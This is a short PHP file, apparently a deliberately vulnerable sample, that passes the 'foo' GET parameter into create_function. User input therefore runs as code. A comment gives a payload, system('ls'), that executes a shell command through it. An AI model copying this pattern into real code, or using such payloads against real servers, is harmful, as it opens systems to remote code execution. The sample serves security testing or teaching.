<?php
//payload=?foo=system('ls')
$foo=$_GET['foo'];
$dyn_func=create_function('$foo',"echo $foo;");
$dyn_func('');
?>
